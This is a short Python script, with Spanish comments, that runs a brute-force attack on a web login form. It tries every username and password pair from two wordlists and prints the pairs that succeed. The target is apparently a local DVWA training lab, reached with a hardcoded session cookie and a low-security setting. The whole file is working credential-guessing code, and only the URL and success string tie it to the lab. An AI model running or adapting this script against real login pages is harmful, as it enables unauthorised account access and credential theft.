import requests

def intento_login(session, url, username, password):
    data = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    response = session.get(url, params=data)
    return 'Welcome to the password protected area' in response.text

def ataque_fuerza_bruta(url, usuarios, passwords):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'Referer': 'http://localhost:8081/vulnerabilities/brute/'
    })
    
    # Configuración de cookies específicas
    session.cookies.set('PHPSESSID', 'g7ascrrfbkq5t39hdgn99d7ci6')
    session.cookies.set('security', 'low')

    credenciales_validas = []

    for usuario in usuarios:
        for password in passwords:
            if intento_login(session, url, usuario, password):
                credenciales_validas.append((usuario, password))
    
    if credenciales_validas:
        print("\nResumen de todas las credenciales válidas encontradas:")
        for usuario, password in credenciales_validas:
            print(f"Usuario: {usuario}, Contraseña: {password}")
    else:
        print("No se encontraron credenciales válidas.")

# Leer usuarios desde el archivo users.txt
with open('users.txt', 'r') as file:
    usuarios = [line.strip() for line in file]

# Leer contraseñas desde el archivo passwords.txt
with open('passwords.txt', 'r') as file:
    passwords = [line.strip() for line in file]

# URL del formulario de login
url = 'http://localhost:8081/vulnerabilities/brute/'

ataque_fuerza_bruta(url, usuarios, passwords)